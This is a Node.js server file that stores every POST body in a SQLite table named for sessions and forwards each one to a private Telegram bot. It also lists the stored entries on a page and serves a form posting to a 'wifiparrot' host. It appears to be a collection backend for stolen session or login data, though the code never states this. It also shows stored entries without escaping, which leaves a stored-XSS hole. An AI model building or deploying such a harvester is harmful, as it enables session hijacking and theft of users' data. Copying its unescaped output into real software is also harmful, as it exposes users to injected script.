const http = require('http')
const https = require('https');
const { count } = require('console')
var sqlite3 = require('sqlite3').verbose()
const port = process.env.PORT || 4000
const host = 'localhost'
const db = new sqlite3.Database(
  './users.db',
  sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE
)
//
db.run(
  "create table IF NOT EXISTS 'enteries'(id varchar(255) primary key, session text)",
  err => console.log(err || 'init db no error')
)

const server = http.createServer(function (request, response) {
  console.dir(request.param)

  if (request.method == 'POST') {
    console.log('POST')
    var body = ''
    request.on('data', function (data) {
      body += data
      console.log('Partial body: ' + body)
    })
    request.on('end', function () {
      console.log('Body: ' + body)
      https.get(`https://api.telegram.org/bot{{Your bot token}}/sendMessage?chat_id={{your telegram id}}&text=${body}`);
      response.writeHead(200, { 'Content-Type': 'text/html' })
      response.end('post received')
      db.run('INSERT INTO enteries (session) VALUES(?)', [body], err =>
        console.log(err || 'inserting data no error')
      )
    })
  } else {
    console.log('GET')
    let enteries = '<ul>'
    db.each(
      'SELECT * FROM enteries',
      (err, row) => {
        console.log(err || 'fetching data no error')
        enteries += '<li><b>' + row.session + '<b></li>'
      },
      (err, index) => {
        console.log(err || 'completting data no error')
        var html = `
      <html>
          <body>
          ${enteries}
          <h1>version: 2.2.1</h1>
              <form method="post" action="https://wifiparrot.herokuapp.com">Name: 
                  <input type="text" name="name" />
                  <input type="submit" value="Submit" />
              </form>
          </body>
      </html>`
        response.writeHead(200, { 'Content-Type': 'text/html' })
        response.end(html)
      }
    )
  }
})

server.listen(port)
console.log(`Listening at http://${host}:${port}`)
